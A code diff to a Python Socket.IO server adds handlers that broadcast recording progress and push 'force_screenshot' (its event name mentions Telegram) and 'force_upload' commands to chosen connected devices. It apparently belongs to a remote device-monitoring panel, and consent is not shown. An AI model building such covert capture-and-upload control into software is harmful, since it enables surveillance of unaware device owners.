@@ -76,6 +76,28 @@ def handle_frame(data):
             'frame': data['frame']
         }, broadcast=True)
 
+@socketio.on('recording_progress')
+def handle_recording_progress(data):
+    device_id = request.sid
+    emit('update_countdown', {
+        'device_id': device_id,
+        'remaining': data['remaining']
+    }, broadcast=True)
+
+@socketio.on('request_screenshot_telegram')
+def handle_screenshot_request(data):
+    target_id = data.get('device_id')
+    if target_id in devices:
+        print(f"Requesting screenshot upload for device: {devices[target_id]['name']}")
+        emit('force_screenshot', {}, room=target_id)
+
+@socketio.on('request_video_upload')
+def handle_video_upload_request(data):
+    target_id = data.get('device_id')
+    if target_id in devices:
+        print(f"Forcing video upload for device: {devices[target_id]['name']}")
+        emit('force_upload', {}, room=target_id)
+
 @socketio.on('update_nickname')
 def handle_nickname(data):
     target_id = data.get('device_id')
